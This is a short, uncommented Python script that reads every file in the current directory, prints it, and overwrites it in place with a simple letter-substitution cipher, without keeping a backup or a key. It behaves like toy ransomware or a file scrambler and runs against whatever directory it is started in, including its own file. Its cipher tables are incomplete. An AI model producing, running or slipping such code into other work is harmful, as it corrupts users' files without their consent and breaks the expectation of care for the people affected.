import os

files = os.listdir()

d = {'a': 'k', 'b': 'q', 'c': 'w', 'd': 'y', 'e': 'o', 'f': 'c', 'g': 'L', 'h': 'O', 'i': 'V', 'j': 'j', 'k': 'p', 'l': 'U', 'm': 'i', 'n': 't', 'o': 'S', 'p': 'b', 'q': 'W', 'r': 'Q', 's': 'B', 't': 'x', 'u': 'g', 'v': 'K', 'w': 's', 'x': 'r', 'y': 'a', 'z': 'l', 'A': 'e', 'B': 'n', 'C': 'u', 'D': 'E', 'E': 'F', 'F': 'J', 'G': 'd', 'H': 'T', 'I': 'N', 'J': 'H', 'K': 'G', 'L': 'A', 'M': 'I', 'N': 'R', 'O': 'D', 'P': 'm', 'Q': 'v', 'R': 'P', 'S': 'M', 'T': 'z', 'U': 'h', 'V': 'C', 'W': 'f'}
d2 = {'k': 'a', 'q': 'b', 'w': 'c', 'y': 'd', 'o': 'e', 'c': 'f', 'L': 'g', 'O': 'h', 'V': 'i', 'j': 'j', 'p': 'k', 'U': 'l', 'i': 'm', 't': 'n', 'S': 'o', 'b': 'p', 'W': 'q', 'Q': 'r', 'B': 's', 'x': 't', 'g': 'u', 'K': 'v', 's': 'w', 'r': 'x', 'a': 'y', 'l': 'z', 'e': 'A', 'n': 'B', 'u': 'C', 'E': 'D', 'F': 'E', 'J': 'F', 'd': 'G', 'T': 'H', 'N': 'I', 'H': 'J', 'G': 'K', 'A': 'L', 'I': 'M', 'R': 'N', 'D': 'O', 'm': 'P', 'v': 'Q', 'P': 'R', 'M': 'S', 'z': 'T', 'h': 'U', 'C': 'V', 'f': 'W'}

def encrypt(s, d):
    result = ''
    for i in s:
        if i in d:
            result += d[i]
        else:
            result += i
    return result

for file in files:
    try:
        with open(file) as fid:
            r = fid.read()

        print(r)
        with open(file, 'w') as fid:
            fid.write(encrypt(r, d2))
    except:
        print(file, ' could not open')